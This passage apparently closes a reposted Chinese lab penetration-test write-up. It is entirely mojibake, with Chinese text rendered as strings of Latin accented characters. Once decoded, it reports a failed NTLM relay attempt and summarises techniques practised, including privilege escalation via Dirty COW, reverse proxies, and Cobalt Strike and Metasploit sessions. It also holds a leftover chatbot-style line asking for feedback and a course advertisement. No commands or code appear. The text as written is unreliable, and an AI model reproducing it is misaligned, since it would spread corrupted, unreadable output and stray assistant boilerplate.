åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ä»…è·å–åˆ° NTLM hash å€¼ï¼Œæœªé€šè¿‡ MultiRelay è·å–åˆ° shellï¼Œæ¨æµ‹å¯èƒ½ç”±ç¯å¢ƒé—®é¢˜å¯¼è‡´ã€‚  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YyFBn6cQ8zQetoBn7oBrATUYDKpWRQr8yWjlK4mgPCVOliaMRqcso9lA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YoiapSNleoPmKY0qyMJvx4Xrc6NEPUFicAJ5m8kURDm3E53OphFcic32zw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YkkUNCibX9CNVzVJHfIWscYnOlv1gUoEjsyQkSjTftftXaTW6ibRZTZaw/640?wx_fmt=png&from=appmsg "")  
  
## äº”ã€æ€»ç»“  
  
  
é€šè¿‡æœ¬æ¬¡é¶åœºæ¸—é€æµ‹è¯•ï¼Œå­¦ä¹ åˆ°è¯¸å¤šå®ç”¨æŠ€æœ¯ï¼Œæ¶µç›–æŒ‡çº¹è¯†åˆ« cms åˆ° getshellã€ä¸»æœºä¿¡æ¯æ”¶é›†ã€æ­£åå‘ä»£ç†ã€è„ç‰› / Ubuntu ææƒã€smb æ‰«æåˆ°åŸŸã€NTLM Relay æ”»å‡»ç­‰æ–¹é¢ã€‚å°¤å…¶æ˜¯ NTLM Relay æ”»å‡»ï¼Œåœ¨å®è·µè¿‡ç¨‹ä¸­èŠ±è´¹å¤§é‡æ—¶é—´è¿›è¡Œç ”ç©¶ä¸å°è¯•ã€‚åŒæ—¶ï¼Œè¿˜å¯¹ cs ä¸Šçº¿ linuxã€æ­£åå‘ä»£ç†ä¸Šçº¿ Cs/Msf ç­‰æŠ€æœ¯è¿›è¡Œäº†æ¢ç´¢ã€‚åç»­å°†ç»§ç»­æ·±å…¥å­¦ä¹ ï¼Œæå‡æ¸—é€æµ‹è¯•æŠ€èƒ½ï¼Œä¼˜åŒ–æ“ä½œæµç¨‹ä¸æŠ€æœ¯åº”ç”¨ã€‚  
  
  
ä»¥ä¸Šä¼˜åŒ–åçš„æ–‡æ¡£å¯¹æ¸—é€è¿‡ç¨‹åšäº†æ›´æ¸…æ™°æ¢³ç†ã€‚ä½ å¯ä»¥è¯´è¯´å¯¹å†…å®¹ç»“æ„ã€æŠ€æœ¯ç»†èŠ‚ç­‰æ–¹é¢çš„çœ‹æ³•ï¼Œæˆ–æå‡ºå…¶ä»–ä¿®æ”¹éœ€æ±‚ã€‚  
  
  
æ–‡ç« è½¬è‡ªå…ˆçŸ¥ç¤¾åŒºï¼ŒåŸä½œè€…vghostï¼Œä¾µåˆ   
  
  
  
  
ç½‘ç»œå®‰å…¨å¤§å¸ˆç­C13å·²åœ¨ä¸Šå‘¨æ—¥æ­£å¼å¼€ç­ï¼Œç¬¬ä¸€å¤©å¼€ç­ï¼Œå­¦å‘˜çš„åé¦ˆå¦‚ä½•å‘¢ï¼Ÿç®€å•æ”¶é›†å‡ å¼ çœŸå®åé¦ˆï¼Œéƒ½åœ¨å›¾é‡Œå•¦ï¼  
  
ç»¼åˆæ¥çœ‹ï¼Œå­¦å‘˜å¯¹è¯¥è¯¾ç¨‹çš„è¯„ä»·éƒ½æŒºé«˜çš„ï¼Œå¦‚æœä½ ä¹Ÿæƒ³ç³»ç»Ÿå­¦ä¹ ç½‘ç»œå®‰å…¨ï¼Œæ¬¢è¿æ‰«ç å’¨è¯¢è¯¾ç¨‹è¯¦æƒ…~  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnzUZSPvXhVfSqMdycgzQNticibKVKkmlzZLP2DUgwGgOicCNjooP2mY2cSjhia7tW2SPpJ14Ued1q6eg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3Y0gnS1j2yUUo4iaFYekr9YGbEJrQnNNdhHTJtuBraDnQhZeECFqWer4g/640?wx_fmt=jpeg&from=appmsg "")  
##   
  
  
  
